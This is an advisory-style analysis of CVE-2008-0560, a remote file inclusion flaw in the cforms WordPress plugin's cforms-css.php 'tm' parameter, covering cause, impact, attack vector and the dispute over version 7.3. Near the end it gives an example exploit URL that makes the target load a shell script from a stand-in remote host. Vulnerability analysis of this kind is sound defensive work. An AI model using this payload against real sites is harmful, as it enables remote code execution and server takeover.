Based on the provided information, here's an analysis of CVE-2008-0560:

**Root cause of vulnerability:**
The vulnerability is a remote file inclusion issue in the `cforms-css.php` file of the Oliver Seidel cforms (contactforms) WordPress plugin. The vulnerability is triggered by using a URL in the `tm` parameter, which then attempts to include the remote resource as a PHP file.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The application includes a file from a remote server based on user input without proper sanitization. This is a direct injection vulnerability allowing for execution of arbitrary code.
- **Lack of input validation:** The `tm` parameter, which is used to specify the remote file, is not validated, allowing for arbitrary URLs.

**Impact of exploitation:**
- **Arbitrary Code Execution:** A remote attacker can execute arbitrary PHP code on the server by including a malicious PHP file from a remote location through the vulnerable `tm` parameter. This could lead to complete compromise of the affected server.
- **System takeover**: Full control over the server and the web application, including data theft, defacement, and denial of service.

**Attack vectors:**
- **HTTP Request:** The attack is performed by sending a crafted HTTP request to the vulnerable `cforms-css.php` file with a malicious URL in the `tm` parameter.

**Required attacker capabilities/position:**
- **Remote Access:** The attacker can exploit the vulnerability remotely over the network.
- **No Authentication:** The vulnerability can be exploited without requiring any prior authentication to the target web application.

**Additional notes:**
- **Disputed:** It has been noted that the vulnerability is disputed for version 7.3 as there is no `tm` parameter and the code exits with a fatal error. The identified exploit targets an older version.
- **Exploit Example:** An example of a potential exploit is provided: `http://Example.com/contactforms/cforms-css.php?tm=http://site.com/shell.php` where `http://site.com/shell.php` contains the malicious php code.
- **CWE:** The vulnerability is classified as CWE-94 Improper Control of Generation of Code ('Code Injection')
